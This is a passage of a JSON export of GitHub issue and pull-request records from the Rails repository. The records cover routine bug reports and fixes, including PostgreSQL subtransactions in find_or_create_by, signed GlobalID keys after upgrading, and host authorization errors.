        "node_id": "PR_kwDNIULOZrMvag",
        "number": 51054,
        "title": "Do not force limits on nested records marked for destruction.",
        "user": {
            "login": "ruyrocha",
            "id": 108208,
            "node_id": "MDQ6VXNlcjEwODIwOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/108208?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ruyrocha",
            "html_url": "https://github.com/ruyrocha",
            "followers_url": "https://api.github.com/users/ruyrocha/followers",
            "following_url": "https://api.github.com/users/ruyrocha/following{/other_user}",
            "gists_url": "https://api.github.com/users/ruyrocha/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ruyrocha/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ruyrocha/subscriptions",
            "organizations_url": "https://api.github.com/users/ruyrocha/orgs",
            "repos_url": "https://api.github.com/users/ruyrocha/repos",
            "events_url": "https://api.github.com/users/ruyrocha/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ruyrocha/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T02:02:53Z",
        "updated_at": "2024-02-14T00:59:06Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51054",
            "html_url": "https://github.com/rails/rails/pull/51054",
            "diff_url": "https://github.com/rails/rails/pull/51054.diff",
            "patch_url": "https://github.com/rails/rails/pull/51054.patch",
            "merged_at": null
        },
        "body": "Fixes #51029\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because the limits for nested attributes didn't reject records marked for destruction.\r\n\r\n### Detail\r\n\r\nThis Pull Request ensures records marked for destruction won't interfere on limits.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51054/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51054/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51053",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51053/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51053/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51053/events",
        "html_url": "https://github.com/rails/rails/pull/51053",
        "id": 2131231230,
        "node_id": "PR_kwDNIULOZrHFvw",
        "number": 51053,
        "title": "Refactor `Rails::Rack::Logger` to avoid adding a new param to `call_app`",
        "user": {
            "login": "ghiculescu",
            "id": 509837,
            "node_id": "MDQ6VXNlcjUwOTgzNw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/509837?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ghiculescu",
            "html_url": "https://github.com/ghiculescu",
            "followers_url": "https://api.github.com/users/ghiculescu/followers",
            "following_url": "https://api.github.com/users/ghiculescu/following{/other_user}",
            "gists_url": "https://api.github.com/users/ghiculescu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ghiculescu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ghiculescu/subscriptions",
            "organizations_url": "https://api.github.com/users/ghiculescu/orgs",
            "repos_url": "https://api.github.com/users/ghiculescu/repos",
            "events_url": "https://api.github.com/users/ghiculescu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ghiculescu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-02-13T00:30:46Z",
        "updated_at": "2024-02-16T02:09:57Z",
        "closed_at": "2024-02-15T17:56:48Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51053",
            "html_url": "https://github.com/rails/rails/pull/51053",
            "diff_url": "https://github.com/rails/rails/pull/51053.diff",
            "patch_url": "https://github.com/rails/rails/pull/51053.patch",
            "merged_at": "2024-02-15T17:56:48Z"
        },
        "body": "ref: https://github.com/rails/rails/pull/50992#issuecomment-1939865460\r\n\r\nThis refactors the implementation from that PR so that we don't need a new param on the `call_app` method. This means we don't break any gems or apps that have overridden it.\r\n\r\ncc @KJTsanaktsidis @rafaelfranca \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51053/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51053/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51052",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51052/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51052/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51052/events",
        "html_url": "https://github.com/rails/rails/issues/51052",
        "id": 2131057210,
        "node_id": "I_kwDNIULOfwVaOg",
        "number": 51052,
        "title": "New find_or_create_by behavior in Rails 7.1 can introduce subtransactions in PostgreSQL",
        "user": {
            "login": "stanhu",
            "id": 963826,
            "node_id": "MDQ6VXNlcjk2MzgyNg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/963826?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/stanhu",
            "html_url": "https://github.com/stanhu",
            "followers_url": "https://api.github.com/users/stanhu/followers",
            "following_url": "https://api.github.com/users/stanhu/following{/other_user}",
            "gists_url": "https://api.github.com/users/stanhu/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/stanhu/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/stanhu/subscriptions",
            "organizations_url": "https://api.github.com/users/stanhu/orgs",
            "repos_url": "https://api.github.com/users/stanhu/repos",
            "events_url": "https://api.github.com/users/stanhu/events{/privacy}",
            "received_events_url": "https://api.github.com/users/stanhu/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-02-12T21:59:02Z",
        "updated_at": "2024-02-27T08:47:47Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "In https://github.com/rails/rails/pull/45720, `find_or_create_by` was modified to call `create_or_find_by`, but that [method](https://github.com/rails/rails/blob/023a3eb3c046091a5d52027393a6d29d0576da01/activerecord/lib/active_record/relation.rb#L214-L218) can introduce subtransactions in PostgreSQL via the `transaction(requires_new: true)` call:\r\n\r\n```ruby\r\ndef create_or_find_by(attributes, &block)\r\n  transaction(requires_new: true) { create(attributes, &block) }\r\nrescue ActiveRecord::RecordNotUnique\r\n  find_by!(attributes)\r\nend\r\n```\r\n\r\nAs I mentioned in https://about.gitlab.com/blog/2021/09/29/why-we-spent-the-last-month-eliminating-postgresql-subtransactions/, we spent a lot of effort to get rid of subtransactions because they suffer from significant performance issues at scale. We saw all our database replicas stall out at times as a result:\r\n\r\n> In a busy database, it's possible for the size of the subtransaction log to grow so large that the working set no longer fits into memory. This results in a lot of cache misses, which in turn causes a high amount of disk I/O and CPU as PostgreSQL furiously tries to load data from disk to keep up with all the lookups.\r\n\r\nHas this been solved in PostgreSQL yet? No. The commits highlighted in https://postgres.ai/blog/20210831-postgresql-subtransactions-considered-harmful#ideas-for-postgresql-development haven't made it into PostgreSQL upstream yet. I see there is recent activity in this thread: https://www.postgresql.org/message-id/flat/CAFiTN-vzDvNz=ExGXz6gdyjtzGixKSqs0mKHMmaQ8sOSEFZ33A@mail.gmail.com\r\n\r\nFor now, we're going to patch ActiveRecord to revert the change, but I'd suggest reverting this or making it some option for those who really need to deal with the racy conditions outlined.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51052/reactions",
            "total_count": 4,
            "+1": 4,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51052/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51051",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51051/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51051/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51051/events",
        "html_url": "https://github.com/rails/rails/issues/51051",
        "id": 2130674027,
        "node_id": "I_kwDNIULOfv-Baw",
        "number": 51051,
        "title": "GlobalID::Locator.locate_signed cannot find SGIDs created in a Rails 6.1 app",
        "user": {
            "login": "goulvench",
            "id": 419086,
            "node_id": "MDQ6VXNlcjQxOTA4Ng==",
            "avatar_url": "https://avatars.githubusercontent.com/u/419086?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/goulvench",
            "html_url": "https://github.com/goulvench",
            "followers_url": "https://api.github.com/users/goulvench/followers",
            "following_url": "https://api.github.com/users/goulvench/following{/other_user}",
            "gists_url": "https://api.github.com/users/goulvench/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/goulvench/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/goulvench/subscriptions",
            "organizations_url": "https://api.github.com/users/goulvench/orgs",
            "repos_url": "https://api.github.com/users/goulvench/repos",
            "events_url": "https://api.github.com/users/goulvench/events{/privacy}",
            "received_events_url": "https://api.github.com/users/goulvench/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-02-12T18:04:00Z",
        "updated_at": "2024-02-21T20:57:37Z",
        "closed_at": "2024-02-21T20:57:36Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n1. Attach `ActiveRecord` items in an `ActionText` in a Rails 6.1 app\r\n2. Update the app to Rails 7.1\r\n3. Display the action_text, but all attachables are missing.\r\n\r\nI found that `Rails.application.key_generator.generate_key('signed_global_ids')` generates different keys in Rails 6 and 7, so I guess it's a config change in the `key_generator` itself.\r\n\r\nThis looks like a duplicate of #40266, but in my case the secret_key_base has not been changed, as shown in the bug report below.\r\nPeople have reported the same problem in the [forum](https://discuss.rubyonrails.org/t/rails-6-1-7-gives-404-for-actiontext-attachments/80803), but the solution isn't applicable in my situation.\r\n\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n[Gist](https://gist.github.com/goulvench/c035bc90ed04c33be2212da43fa35146), or script below\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  #gem \"rails\", \"6.1\"\r\n  gem \"rails\", github: \"rails/rails\", branch: :main\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record/railtie\"\r\nrequire \"active_storage/engine\"\r\nrequire \"action_text/engine\"\r\nrequire \"tmpdir\"\r\n\r\nclass TestApp < Rails::Application\r\n  config.load_defaults 6.1\r\n\r\n  config.root = __dir__\r\n  config.hosts << \"example.org\"\r\n  config.eager_load = false\r\n  config.session_store :cookie_store, key: \"cookie_store_key\"\r\n  config.secret_key_base = \"secret_key_base\"\r\n\r\n  config.active_storage.service = :local\r\n  config.active_storage.service_configurations = {\r\n    local: {\r\n      root: Dir.tmpdir,\r\n      service: \"Disk\"\r\n    }\r\n  }\r\n  # Disable logging for a cleaner output\r\n  config.logger = Logger.new(nil)\r\nend\r\n\r\nENV[\"DATABASE_URL\"] = \"sqlite3::memory:\"\r\n\r\nRails.application.initialize!\r\n\r\nrequire ActiveStorage::Engine.root.join(\"db/migrate/20170806125915_create_active_storage_tables.rb\").to_s\r\n\r\n# Disable migration logging for a cleaner output\r\nActiveRecord::Migration.verbose = false\r\nActiveRecord::Schema.define do\r\n  CreateActiveStorageTables.new.change\r\n\r\n  create_table :users, force: true\r\nend\r\n\r\nclass User < ActiveRecord::Base\r\n  has_one_attached :profile\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_blob_sgid_after_rails_upgrade\r\n    user = User.create!(\r\n      profile: {\r\n        content_type: \"text/plain\",\r\n        filename: \"dummy.txt\",\r\n        io: ::StringIO.new(\"dummy\"),\r\n      }\r\n    )\r\n    puts \"Rails version: #{Rails::VERSION::STRING}\"\r\n    rails_6_sgid = \"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJalJuYVdRNkx5OTBaWE4wTFdGd2NDOUJZM1JwZG1WVGRHOXlZV2RsT2pwQ2JHOWlMekUvWlhod2FYSmxjMTlwYmdZNkJrVlUiLCJleHAiOm51bGwsInB1ciI6ImF0dGFjaGFibGUifX0=--aa099340e7af7ec6ce1af3866ade911ea22c7834\"\r\n\r\n    assert_equal rails_6_sgid, user.profile.blob.attachable_sgid\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\n```ruby\r\nGlobalID::Locator.locate_signed(rails_6_sgid) # => Original attachable\r\n```\r\n\r\n### Actual behavior\r\n\r\n```ruby\r\nGlobalID::Locator.locate_signed(rails_6_sgid) # => nil\r\n```\r\n\r\n### System configuration\r\n- **Rails version**: 7.1.3 and edge\r\n- **Ruby version**: 3.1.4\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51051/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51051/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51050",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51050/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51050/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51050/events",
        "html_url": "https://github.com/rails/rails/pull/51050",
        "id": 2130419983,
        "node_id": "PR_kwDNIULOZqajZQ",
        "number": 51050,
        "title": "ActionDispatch::Executor: report errors handled by ShowExceptions",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-12T15:51:06Z",
        "updated_at": "2024-02-12T17:09:51Z",
        "closed_at": "2024-02-12T16:51:02Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51050",
            "html_url": "https://github.com/rails/rails/pull/51050",
            "diff_url": "https://github.com/rails/rails/pull/51050.diff",
            "patch_url": "https://github.com/rails/rails/pull/51050.patch",
            "merged_at": "2024-02-12T16:51:02Z"
        },
        "body": "Fix: https://github.com/rails/rails/issues/51002\r\n\r\nIn the default middleware stack, the `ShowExceptions` middleware is lower than `ActionDispatch::Execturor` and will handle most exceptions causing `Executor` not to witness any.\r\n\r\nInstead we need to rely on `action_dispatch.exception` being added into the request env.\r\n\r\nFYI @fractaledmind @rafaelfranca \r\n\r\nTo be backported to 7.1 and 7.0.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51050/reactions",
            "total_count": 2,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 1,
            "confused": 0,
            "heart": 0,
            "rocket": 1,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51050/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51049",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51049/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51049/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51049/events",
        "html_url": "https://github.com/rails/rails/pull/51049",
        "id": 2130370257,
        "node_id": "PR_kwDNIULOZqX0pg",
        "number": 51049,
        "title": "[DOCS] Warn against uniqueness validator when create_or_find_by is used [ci-skip]",
        "user": {
            "login": "sobstel",
            "id": 117428,
            "node_id": "MDQ6VXNlcjExNzQyOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/117428?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sobstel",
            "html_url": "https://github.com/sobstel",
            "followers_url": "https://api.github.com/users/sobstel/followers",
            "following_url": "https://api.github.com/users/sobstel/following{/other_user}",
            "gists_url": "https://api.github.com/users/sobstel/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sobstel/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sobstel/subscriptions",
            "organizations_url": "https://api.github.com/users/sobstel/orgs",
            "repos_url": "https://api.github.com/users/sobstel/repos",
            "events_url": "https://api.github.com/users/sobstel/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sobstel/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-12T15:26:25Z",
        "updated_at": "2024-02-13T06:46:24Z",
        "closed_at": "2024-02-13T06:45:59Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51049",
            "html_url": "https://github.com/rails/rails/pull/51049",
            "diff_url": "https://github.com/rails/rails/pull/51049.diff",
            "patch_url": "https://github.com/rails/rails/pull/51049.patch",
            "merged_at": "2024-02-13T06:45:59Z"
        },
        "body": "### Motivation / Background\r\n\r\nIt can be really confusing when use you have `uniqueness` validator and try to use `create_by_find_by` eg. https://github.com/rails/rails/issues/36027. \r\n\r\n### Checklist\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51049/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51049/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51048",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51048/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51048/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51048/events",
        "html_url": "https://github.com/rails/rails/issues/51048",
        "id": 2129545590,
        "node_id": "I_kwDNIULOfu5Jdg",
        "number": 51048,
        "title": "Blocked hosts: site.com To allow requests to these hosts, make sure they are valid hostnames (containing only numbers, letters, dashes and dots), then add the following to your environment configuration:     config.hosts << \"site.com\"    For more details view: the Host Authorization guide",
        "user": {
            "login": "misheck12",
            "id": 49679254,
            "node_id": "MDQ6VXNlcjQ5Njc5MjU0",
            "avatar_url": "https://avatars.githubusercontent.com/u/49679254?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/misheck12",
            "html_url": "https://github.com/misheck12",
            "followers_url": "https://api.github.com/users/misheck12/followers",
            "following_url": "https://api.github.com/users/misheck12/following{/other_user}",
            "gists_url": "https://api.github.com/users/misheck12/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/misheck12/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/misheck12/subscriptions",
            "organizations_url": "https://api.github.com/users/misheck12/orgs",
            "repos_url": "https://api.github.com/users/misheck12/repos",
            "events_url": "https://api.github.com/users/misheck12/events{/privacy}",
            "received_events_url": "https://api.github.com/users/misheck12/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1071962662,
                "node_id": "MDU6TGFiZWwxMDcxOTYyNjYy",
                "url": "https://api.github.com/repos/rails/rails/labels/more-information-needed",
                "name": "more-information-needed",
                "color": "bfdadc",
                "default": false,
                "description": "When reporter needs to provide more information"
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-12T07:14:08Z",
        "updated_at": "2024-02-14T23:44:35Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# Your reproduction script goes here\r\n\r\n# Load the Rails application.\r\nrequire_relative \"application\"\r\n\r\n# Initialize the Rails application.\r\nRails.application.configure do\r\n  # Add site.com to allowed hosts\r\n  config.hosts << \"site.com\"\r\nend\r\n\r\nRails.application.initialize!\r\n```\r\n\r\n### Expected behavior\r\nthe domain should be accessible without errors\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\n```\r\nBlocked hosts: site.com\r\nTo allow requests to these hosts, make sure they are valid hostnames (containing only numbers, letters, dashes and dots), then add the following to your environment configuration:\r\n    config.hosts << \"site.com\"\r\n  \r\nFor more details view: [the Host Authorization guide](https://guides.rubyonrails.org/configuring.html#actiondispatch-hostauthorization). \r\n```\r\n\r\n### System configuration\r\n**Rails version**:\r\nRails 7.1.3\r\n**Ruby version**:\r\n3.2.3\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51048/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51048/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51047",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51047/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51047/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51047/events",
        "html_url": "https://github.com/rails/rails/pull/51047",
        "id": 2129247227,
        "node_id": "PR_kwDNIULOZpag9w",
        "number": 51047,
        "title": "Add query docs for delegated type [ci skip]",
        "user": {
            "login": "johnpitchko",
            "id": 7190681,
            "node_id": "MDQ6VXNlcjcxOTA2ODE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7190681?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/johnpitchko",
            "html_url": "https://github.com/johnpitchko",
            "followers_url": "https://api.github.com/users/johnpitchko/followers",
            "following_url": "https://api.github.com/users/johnpitchko/following{/other_user}",
            "gists_url": "https://api.github.com/users/johnpitchko/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/johnpitchko/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/johnpitchko/subscriptions",
            "organizations_url": "https://api.github.com/users/johnpitchko/orgs",
            "repos_url": "https://api.github.com/users/johnpitchko/repos",
            "events_url": "https://api.github.com/users/johnpitchko/events{/privacy}",
            "received_events_url": "https://api.github.com/users/johnpitchko/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-12T00:26:49Z",
        "updated_at": "2024-02-20T23:22:49Z",
        "closed_at": "2024-02-20T23:22:49Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51047",
            "html_url": "https://github.com/rails/rails/pull/51047",
            "diff_url": "https://github.com/rails/rails/pull/51047.diff",
            "patch_url": "https://github.com/rails/rails/pull/51047.patch",
            "merged_at": "2024-02-20T23:22:49Z"
        },
